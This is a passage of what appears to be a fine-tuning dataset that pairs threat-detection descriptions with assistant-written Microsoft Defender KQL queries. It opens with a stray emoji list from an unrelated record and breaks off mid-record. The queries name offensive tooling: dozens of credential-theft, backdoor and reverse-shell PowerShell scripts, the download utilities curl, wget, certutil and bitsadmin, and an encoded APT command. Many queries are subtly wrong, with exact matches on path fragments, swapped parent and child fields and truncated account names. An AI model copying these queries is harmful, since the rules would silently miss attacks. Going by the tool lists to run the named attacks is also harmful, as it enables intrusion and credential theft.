\"\ud83e\udd18\ud83c\udffc\", \"\ud83e\udd19\ud83c\udffc\", \"\ud83e\udef5\ud83c\udffc\", \"\ud83e\udef1\ud83c\udffc\", \"\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef3\ud83c\udffc\", \"\ud83e\udef4\ud83c\udffc\", \"\ud83d\udc48\ud83c\udffc\", \"\ud83d\udc49\ud83c\udffc\", \"\ud83d\udc46\ud83c\udffc\", \"\ud83d\udd95\ud83c\udffc\", \"\ud83d\udc47\ud83c\udffc\", \"\u261d\ud83c\udffc\", \"\ud83d\udc4d\ud83c\udffc\", \"\ud83d\udc4e\ud83c\udffc\", \"\u270a\ud83c\udffc\", \"\ud83d\udc4a\ud83c\udffc\", \"\ud83e\udd1b\ud83c\udffc\", \"\ud83e\udd1c\ud83c\udffc\", \"\ud83d\udc4f\ud83c\udffc\", \"\ud83e\udef6\ud83c\udffc\", \"\ud83d\ude4c\ud83c\udffc\", \"\ud83d\udc50\ud83c\udffc\", \"\ud83e\udd32\ud83c\udffc\", \"\ud83d\ude4f\ud83c\udffc\", \"\u270d\ud83c\udffc\", \"\ud83d\udcaa\ud83c\udffc\", \"\ud83e\uddb5\ud83c\udffc\", \"\ud83e\uddb6\ud83c\udffc\", \"\ud83d\udc42\ud83c\udffc\", \"\ud83e\uddbb\ud83c\udffc\", \"\ud83d\udc43\ud83c\udffc\", \"\ud83d\udc76\ud83c\udffc\", \"\ud83d\udc67\ud83c\udffc\", \"\ud83e\uddd2\ud83c\udffc\", \"\ud83d\udc66\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb1\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb1\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb1\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb0\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb0\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb0\", \"\ud83d\udc71\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc71\ud83c\udffc\", \"\ud83d\udc71\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb3\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb3\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb3\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb2\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb2\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb2\", \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffc\", \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc75\ud83c\udffc\", \"\ud83e\uddd3\ud83c\udffc\", \"\ud83d\udc74\ud83c\udffc\", \"\ud83d\udc72\ud83c\udffc\", \"\ud83d\udc73\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc73\ud83c\udffc\", \"\ud83d\udc73\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddd5\ud83c\udffc\", \"\ud83d\udc6e\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc6e\ud83c\udffc\", \"\ud83d\udc6e\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc77\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc77\ud83c\udffc\", \"\ud83d\udc77\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc82\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc82\ud83c\udffc\", \"\ud83d\udc82\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udd75\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udd75\ud83c\udffc\", \"\ud83d\udd75\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffc\u200d\u2695\ufe0f\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2695\ufe0f\", \"\ud83d\udc68\ud83c\udffc\u200d\u2695\ufe0f\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf3e\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf3e\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf3e\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf73\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf73\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf73\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf93\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf93\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf93\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa4\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa4\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa4\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfeb\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfeb\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfeb\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfed\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfed\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfed\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbb\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbb\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbb\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbc\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbc\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbc\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd27\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd27\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd27\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd2c\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd2c\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd2c\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa8\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa8\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa8\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude92\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude92\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude92\", \"\ud83d\udc69\ud83c\udffc\u200d\u2708\ufe0f\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2708\ufe0f\", \"\ud83d\udc68\ud83c\udffc\u200d\u2708\ufe0f\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude80\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude80\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude80\", \"\ud83d\udc69\ud83c\udffc\u200d\u2696\ufe0f\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2696\ufe0f\", \"\ud83d\udc68\ud83c\udffc\u200d\u2696\ufe0f\", \"\ud83d\udc70\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc70\ud83c\udffc\", \"\ud83d\udc70\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd35\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd35\ud83c\udffc\", \"\ud83e\udd35\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc78\ud83c\udffc\", \"\ud83e\udec5\ud83c\udffc\", \"\ud83e\udd34\ud83c\udffc\", \"\ud83e\udd77\ud83c\udffc\", \"\ud83e\uddb8\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddb8\ud83c\udffc\", \"\ud83e\uddb8\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddb9\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddb9\ud83c\udffc\", \"\ud83e\uddb9\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd36\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf84\", \"\ud83c\udf85\ud83c\udffc\", \"\ud83e\uddd9\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd9\ud83c\udffc\", \"\ud83e\uddd9\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udddd\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udddd\ud83c\udffc\", \"\ud83e\udddd\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udddb\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udddb\ud83c\udffc\", \"\ud83e\udddb\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udddc\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udddc\ud83c\udffc\", \"\ud83e\udddc\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddda\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddda\ud83c\udffc\", \"\ud83e\uddda\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc7c\ud83c\udffc\", \"\ud83e\udd30\ud83c\udffc\", \"\ud83e\udec4\ud83c\udffc\", \"\ud83e\udec3\ud83c\udffc\", \"\ud83e\udd31\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf7c\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf7c\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf7c\", \"\ud83d\ude47\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude47\ud83c\udffc\", \"\ud83d\ude47\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc81\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc81\ud83c\udffc\", \"\ud83d\udc81\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\ude45\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude45\ud83c\udffc\", \"\ud83d\ude45\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\ude46\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude46\ud83c\udffc\", \"\ud83d\ude46\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\ude4b\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude4b\ud83c\udffc\", \"\ud83d\ude4b\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddcf\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddcf\ud83c\udffc\", \"\ud83e\uddcf\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd26\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd26\ud83c\udffc\", \"\ud83e\udd26\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd37\ud83c\udffc\u200d\u2640\ufe0f\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential QBot activity by looking for process executions used previously by QBot Topic: proc_creation_win_malware_qbot"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\WinRAR.exe\" and InitiatingProcessFolderPath =~ \"\\\\wscript.exe\") or ProcessCommandLine =~ \" /c ping.exe -n 6 127.0.0.1 & type \" or (ProcessCommandLine in~ (\"regsvr32.exe\", \"C:\\\\ProgramData\", \".tmp\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"roboform.dll\", a DLL used by RoboForm Password Manager Topic: image_load_side_load_robform"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\roboform.dll\" or FolderPath endswith \"\\\\roboform-x64.dll\") and (not((InitiatingProcessFolderPath in~ (\"\\\\robotaskbaricon.exe\", \"\\\\robotaskbaricon-x64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account) Topic: proc_creation_win_sysinternals_psexesvc_as_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\PSEXESVC.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file creation events with filename patterns used by CrackMapExec. Topic: file_event_win_hktl_crackmapexec_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\Temp\\\\\" and ((FolderPath matches regex \"\\\\\\\\[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\\\.txt$\" or FolderPath matches regex \"\\\\\\\\[a-zA-Z]{8}\\\\.tmp$\") or (FileName in~ (\"\\\\temp.ps1\", \"\\\\msol.ps1\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable. Topic: proc_creation_win_reg_software_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"query\", \"\\\\software\\\\\", \"/v\", \"svcversion\")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious print spool service (spoolsv.exe) child processes. Topic: proc_creation_win_spoolsv_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\spoolsv.exe\" and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))) and ((InitiatingProcessFolderPath in~ (\"\\\\gpupdate.exe\", \"\\\\whoami.exe\", \"\\\\nltest.exe\", \"\\\\taskkill.exe\", \"\\\\wmic.exe\", \"\\\\taskmgr.exe\", \"\\\\sc.exe\", \"\\\\findstr.exe\", \"\\\\curl.exe\", \"\\\\wget.exe\", \"\\\\certutil.exe\", \"\\\\bitsadmin.exe\", \"\\\\accesschk.exe\", \"\\\\wevtutil.exe\", \"\\\\bcdedit.exe\", \"\\\\fsutil.exe\", \"\\\\cipher.exe\", \"\\\\schtasks.exe\", \"\\\\write.exe\", \"\\\\wuauclt.exe\", \"\\\\systeminfo.exe\", \"\\\\reg.exe\", \"\\\\query.exe\")) or ((InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\")) and (not(ProcessCommandLine =~ \"start\"))) or (InitiatingProcessFolderPath =~ \"\\\\cmd.exe\" and (not((ProcessCommandLine in~ (\".spl\", \"route add\", \"program files\"))))) or (InitiatingProcessFolderPath =~ \"\\\\netsh.exe\" and (not((ProcessCommandLine in~ (\"add portopening\", \"rule name\"))))) or ((InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and (not(ProcessCommandLine =~ \".spl\"))) or (ProcessCommandLine endswith \"rundll32.exe\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a process via the Windows task manager. This might be an attempt to bypass UAC Topic: proc_creation_win_taskmgr_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\taskmgr.exe\" and (not((InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\System32\\\\mmc.exe\", \":\\\\Windows\\\\System32\\\\resmon.exe\", \":\\\\Windows\\\\System32\\\\Taskmgr.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of \"pc-app.exe\". Which could indicate potential exploitation of PaperCut Topic: proc_creation_win_papercut_print_management_exploitation_pc_app"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\pc-app.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\bash.exe\", \"\\\\calc.exe\", \"\\\\certutil.exe\", \"\\\\cmd.exe\", \"\\\\csc.exe\", \"\\\\cscript.exe\", \"\\\\dllhost.exe\", \"\\\\mshta.exe\", \"\\\\msiexec.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\scriptrunner.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\", \"\\\\wsl.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of known offensive powershell scripts used for exploitation Topic: file_event_win_powershell_exploit_scripts"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\Add-ConstrainedDelegationBackdoor.ps1\", \"\\\\Add-Exfiltration.ps1\", \"\\\\Add-Persistence.ps1\", \"\\\\Add-RegBackdoor.ps1\", \"\\\\Add-RemoteRegBackdoor.ps1\", \"\\\\Add-ScrnSaveBackdoor.ps1\", \"\\\\ADRecon.ps1\", \"\\\\AzureADRecon.ps1\", \"\\\\Check-VM.ps1\", \"\\\\ConvertTo-ROT13.ps1\", \"\\\\Copy-VSS.ps1\", \"\\\\Create-MultipleSessions.ps1\", \"\\\\DNS_TXT_Pwnage.ps1\", \"\\\\dnscat2.ps1\", \"\\\\Do-Exfiltration.ps1\", \"\\\\DomainPasswordSpray.ps1\", \"\\\\Download_Execute.ps1\", \"\\\\Download-Execute-PS.ps1\", \"\\\\Enable-DuplicateToken.ps1\", \"\\\\Enabled-DuplicateToken.ps1\", \"\\\\Execute-Command-MSSQL.ps1\", \"\\\\Execute-DNSTXT-Code.ps1\", \"\\\\Execute-OnTime.ps1\", \"\\\\ExetoText.ps1\", \"\\\\Exploit-Jboss.ps1\", \"\\\\Find-AVSignature.ps1\", \"\\\\Find-Fruit.ps1\", \"\\\\Find-GPOLocation.ps1\", \"\\\\Find-TrustedDocuments.ps1\", \"\\\\FireBuster.ps1\", \"\\\\FireListener.ps1\", \"\\\\Get-ApplicationHost.ps1\", \"\\\\Get-ChromeDump.ps1\", \"\\\\Get-ClipboardContents.ps1\", \"\\\\Get-ComputerDetail.ps1\", \"\\\\Get-FoxDump.ps1\", \"\\\\Get-GPPAutologon.ps1\", \"\\\\Get-GPPPassword.ps1\", \"\\\\Get-IndexedItem.ps1\", \"\\\\Get-Keystrokes.ps1\", \"\\\\Get-LSASecret.ps1\", \"\\\\Get-MicrophoneAudio.ps1\", \"\\\\Get-PassHashes.ps1\", \"\\\\Get-PassHints.ps1\", \"\\\\Get-RegAlwaysInstallElevated.ps1\", \"\\\\Get-RegAutoLogon.ps1\", \"\\\\Get-RickAstley.ps1\", \"\\\\Get-Screenshot.ps1\", \"\\\\Get-SecurityPackages.ps1\", \"\\\\Get-ServiceFilePermission.ps1\", \"\\\\Get-ServicePermission.ps1\", \"\\\\Get-ServiceUnquoted.ps1\", \"\\\\Get-SiteListPassword.ps1\", \"\\\\Get-System.ps1\", \"\\\\Get-TimedScreenshot.ps1\", \"\\\\Get-UnattendedInstallFile.ps1\", \"\\\\Get-Unconstrained.ps1\", \"\\\\Get-USBKeystrokes.ps1\", \"\\\\Get-VaultCredential.ps1\", \"\\\\Get-VulnAutoRun.ps1\", \"\\\\Get-VulnSchTask.ps1\", \"\\\\Get-WebConfig.ps1\", \"\\\\Get-WebCredentials.ps1\", \"\\\\Get-WLAN-Keys.ps1\", \"\\\\Gupt-Backdoor.ps1\", \"\\\\HTTP-Backdoor.ps1\", \"\\\\HTTP-Login.ps1\", \"\\\\Install-ServiceBinary.ps1\", \"\\\\Install-SSP.ps1\", \"\\\\Invoke-ACLScanner.ps1\", \"\\\\Invoke-ADSBackdoor.ps1\", \"\\\\Invoke-AmsiBypass.ps1\", \"\\\\Invoke-ARPScan.ps1\", \"\\\\Invoke-BackdoorLNK.ps1\", \"\\\\Invoke-BadPotato.ps1\", \"\\\\Invoke-BetterSafetyKatz.ps1\", \"\\\\Invoke-BruteForce.ps1\", \"\\\\Invoke-BypassUAC.ps1\", \"\\\\Invoke-Carbuncle.ps1\", \"\\\\Invoke-Certify.ps1\", \"\\\\Invoke-ConPtyShell.ps1\", \"\\\\Invoke-CredentialInjection.ps1\", \"\\\\Invoke-CredentialsPhish.ps1\", \"\\\\Invoke-DAFT.ps1\", \"\\\\Invoke-DCSync.ps1\", \"\\\\Invoke-Decode.ps1\", \"\\\\Invoke-DinvokeKatz.ps1\", \"\\\\Invoke-DllInjection.ps1\", \"\\\\Invoke-DNSUpdate.ps1\", \"\\\\Invoke-DowngradeAccount.ps1\", \"\\\\Invoke-EgressCheck.ps1\", \"\\\\Invoke-Encode.ps1\", \"\\\\Invoke-EventViewer.ps1\", \"\\\\Invoke-Eyewitness.ps1\", \"\\\\Invoke-FakeLogonScreen.ps1\", \"\\\\Invoke-Farmer.ps1\", \"\\\\Invoke-Get-RBCD-Threaded.ps1\", \"\\\\Invoke-Gopher.ps1\", \"\\\\Invoke-Grouper2.ps1\", \"\\\\Invoke-Grouper3.ps1\", \"\\\\Invoke-HandleKatz.ps1\", \"\\\\Invoke-Interceptor.ps1\", \"\\\\Invoke-Internalmonologue.ps1\", \"\\\\Invoke-Inveigh.ps1\", \"\\\\Invoke-InveighRelay.ps1\", \"\\\\Invoke-JSRatRegsvr.ps1\", \"\\\\Invoke-JSRatRundll.ps1\", \"\\\\Invoke-KrbRelay.ps1\", \"\\\\Invoke-KrbRelayUp.ps1\", \"\\\\Invoke-LdapSignCheck.ps1\", \"\\\\Invoke-Lockless.ps1\", \"\\\\Invoke-MalSCCM.ps1\", \"\\\\Invoke-Mimikatz.ps1\", \"\\\\Invoke-MimikatzWDigestDowngrade.ps1\", \"\\\\Invoke-Mimikittenz.ps1\", \"\\\\Invoke-MITM6.ps1\", \"\\\\Invoke-NanoDump.ps1\", \"\\\\Invoke-NetRipper.ps1\", \"\\\\Invoke-NetworkRelay.ps1\", \"\\\\Invoke-NinjaCopy.ps1\", \"\\\\Invoke-OxidResolver.ps1\", \"\\\\Invoke-P0wnedshell.ps1\", \"\\\\Invoke-P0wnedshellx86.ps1\", \"\\\\Invoke-Paranoia.ps1\", \"\\\\Invoke-PortScan.ps1\", \"\\\\Invoke-PoshRatHttp.ps1\", \"\\\\Invoke-PoshRatHttps.ps1\", \"\\\\Invoke-PostExfil.ps1\", \"\\\\Invoke-PowerDump.ps1\", \"\\\\Invoke-PowerShellIcmp.ps1\", \"\\\\Invoke-PowerShellTCP.ps1\", \"\\\\Invoke-PowerShellTcpOneLine.ps1\", \"\\\\Invoke-PowerShellTcpOneLineBind.ps1\", \"\\\\Invoke-PowerShellUdp.ps1\", \"\\\\Invoke-PowerShellUdpOneLine.ps1\", \"\\\\Invoke-PowerShellWMI.ps1\", \"\\\\Invoke-PowerThIEf.ps1\", \"\\\\Invoke-PPLDump.ps1\", \"\\\\Invoke-Prasadhak.ps1\", \"\\\\Invoke-PsExec.ps1\", \"\\\\Invoke-PsGcat.ps1\", \"\\\\Invoke-PsGcatAgent.ps1\", \"\\\\Invoke-PSInject.ps1\", \"\\\\Invoke-PsUaCme.ps1\", \"\\\\Invoke-ReflectivePEInjection.ps1\", \"\\\\Invoke-ReverseDNSLookup.ps1\", \"\\\\Invoke-Rubeus.ps1\", \"\\\\Invoke-RunAs.ps1\", \"\\\\Invoke-SafetyKatz.ps1\", \"\\\\Invoke-SauronEye.ps1\", \"\\\\Invoke-SCShell.ps1\", \"\\\\Invoke-Seatbelt.ps1\", \"\\\\Invoke-ServiceAbuse.ps1\", \"\\\\Invoke-SessionGopher.ps1\", \"\\\\Invoke-ShellCode.ps1\", \"\\\\Invoke-SMBScanner.ps1\", \"\\\\Invoke-Snaffler.ps1\", \"\\\\Invoke-Spoolsample.ps1\", \"\\\\Invoke-SSHCommand.ps1\", \"\\\\Invoke-SSIDExfil.ps1\", \"\\\\Invoke-StandIn.ps1\", \"\\\\Invoke-StickyNotesExtract.ps1\", \"\\\\Invoke-Tater.ps1\", \"\\\\Invoke-Thunderfox.ps1\", \"\\\\Invoke-ThunderStruck.ps1\", \"\\\\Invoke-TokenManipulation.ps1\", \"\\\\Invoke-Tokenvator.ps1\", \"\\\\Invoke-TotalExec.ps1\", \"\\\\Invoke-UrbanBishop.ps1\", \"\\\\Invoke-UserHunter.ps1\", \"\\\\Invoke-VoiceTroll.ps1\", \"\\\\Invoke-Whisker.ps1\", \"\\\\Invoke-WinEnum.ps1\", \"\\\\Invoke-winPEAS.ps1\", \"\\\\Invoke-WireTap.ps1\", \"\\\\Invoke-WmiCommand.ps1\", \"\\\\Invoke-WScriptBypassUAC.ps1\", \"\\\\Invoke-Zerologon.ps1\", \"\\\\Keylogger.ps1\", \"\\\\MailRaider.ps1\", \"\\\\New-HoneyHash.ps1\", \"\\\\OfficeMemScraper.ps1\", \"\\\\Offline_Winpwn.ps1\", \"\\\\Out-CHM.ps1\", \"\\\\Out-DnsTxt.ps1\", \"\\\\Out-Excel.ps1\", \"\\\\Out-HTA.ps1\", \"\\\\Out-Java.ps1\", \"\\\\Out-JS.ps1\", \"\\\\Out-Minidump.ps1\", \"\\\\Out-RundllCommand.ps1\", \"\\\\Out-SCF.ps1\", \"\\\\Out-SCT.ps1\", \"\\\\Out-Shortcut.ps1\", \"\\\\Out-WebQuery.ps1\", \"\\\\Out-Word.ps1\", \"\\\\Parse_Keys.ps1\", \"\\\\Port-Scan.ps1\", \"\\\\PowerBreach.ps1\", \"\\\\powercat.ps1\", \"\\\\Powermad.ps1\", \"\\\\PowerRunAsSystem.psm1\", \"\\\\PowerSharpPack.ps1\", \"\\\\PowerUp.ps1\", \"\\\\PowerUpSQL.ps1\", \"\\\\PowerView.ps1\", \"\\\\PSAsyncShell.ps1\", \"\\\\RemoteHashRetrieval.ps1\", \"\\\\Remove-Persistence.ps1\", \"\\\\Remove-PoshRat.ps1\", \"\\\\Remove-Update.ps1\", \"\\\\Run-EXEonRemote.ps1\", \"\\\\Schtasks-Backdoor.ps1\", \"\\\\Set-DCShadowPermissions.ps1\", \"\\\\Set-MacAttribute.ps1\", \"\\\\Set-RemotePSRemoting.ps1\", \"\\\\Set-RemoteWMI.ps1\", \"\\\\Set-Wallpaper.ps1\", \"\\\\Show-TargetScreen.ps1\", \"\\\\Speak.ps1\", \"\\\\Start-CaptureServer.ps1\", \"\\\\Start-WebcamRecorder.ps1\", \"\\\\StringToBase64.ps1\", \"\\\\TexttoExe.ps1\", \"\\\\VolumeShadowCopyTools.ps1\", \"\\\\WinPwn.ps1\", \"\\\\WSUSpendu.ps1\")) or FileName =~ \"Invoke-Sharp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious command line patterns seen being used by MERCURY APT Topic: proc_creation_win_apt_mercury"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-exec bypass -w 1 -enc\", \"UwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAKABzAGEAcABzACAAKAAiAHAA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects artifacts associated with GALLIUM cyber espionage group as reported by Microsoft Threat Intelligence Center in the December 2019 report. Topic: proc_creation_win_apt_gallium_iocs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (SHA256 startswith \"9ae7c4a4e1cfe9b505c3a47e66551eb1357affee65bfefb0109d02f4e97c06dd\" or SHA256 startswith \"7772d624e1aed327abcd24ce2068063da0e31bb1d5d3bf2841fc977e198c6c5b\" or SHA256 startswith \"657fc7e6447e0065d488a7db2caab13071e44741875044f9024ca843fe4e86b5\" or SHA256 startswith \"2ef157a97e28574356e1d871abf75deca7d7a1ea662f38b577a06dd039dbae29\" or SHA256 startswith \"52fd7b90d7144ac448af4008be639d4d45c252e51823f4311011af3207a5fc77\" or SHA256 startswith \"a370e47cb97b35f1ae6590d14ada7561d22b4a73be0cb6df7e851d85054b1ac3\" or SHA256 startswith \"5bf80b871278a29f356bd42af1e35428aead20cd90b0c7642247afcaaa95b022\" or SHA256 startswith \"6f690ccfd54c2b02f0c3cb89c938162c10cbeee693286e809579c540b07ed883\" or SHA256 startswith 